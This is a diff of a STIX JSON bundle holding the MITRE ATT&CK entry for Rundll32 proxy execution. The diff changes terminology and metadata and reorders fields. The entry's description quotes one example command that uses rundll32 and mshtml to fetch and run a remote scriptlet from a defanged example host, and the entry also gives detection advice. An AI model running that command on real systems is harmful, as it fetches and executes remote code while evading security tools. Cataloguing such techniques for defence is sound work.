@@ -1,11 +1,11 @@
 {
     "type": "bundle",
-    "id": "bundle--df2e5a25-0c4a-4564-a900-f3df05e50664",
+    "id": "bundle--63c45089-2534-4115-83ae-419b546f39df",
     "spec_version": "2.0",
     "objects": [
         {
             "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
-            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
+            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
             "name": "Rundll32",
             "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
             "object_marking_refs": [
@@ -35,11 +35,21 @@
                     "phase_name": "defense-evasion"
                 }
             ],
-            "modified": "2020-03-29T15:34:07.002Z",
+            "modified": "2020-06-20T22:31:42.113Z",
             "created": "2020-01-23T18:03:46.248Z",
-            "x_mitre_contributors": [
-                "Casey Smith",
-                "Ricardo Dias"
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_version": "1.0",
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_defense_bypassed": [
+                "Digital Certificate Validation",
+                "Application control",
+                "Anti-virus"
             ],
             "x_mitre_data_sources": [
                 "DLL monitoring",
@@ -47,19 +57,9 @@
                 "Process command-line parameters",
                 "Process monitoring"
             ],
-            "x_mitre_defense_bypassed": [
-                "Digital Certificate Validation",
-                "Application whitelisting",
-                "Anti-virus"
-            ],
-            "x_mitre_permissions_required": [
-                "User"
-            ],
-            "x_mitre_version": "1.0",
-            "x_mitre_is_subtechnique": true,
-            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
-            "x_mitre_platforms": [
-                "Windows"
+            "x_mitre_contributors": [
+                "Casey Smith",
+                "Ricardo Dias"
             ]
         }
     ]
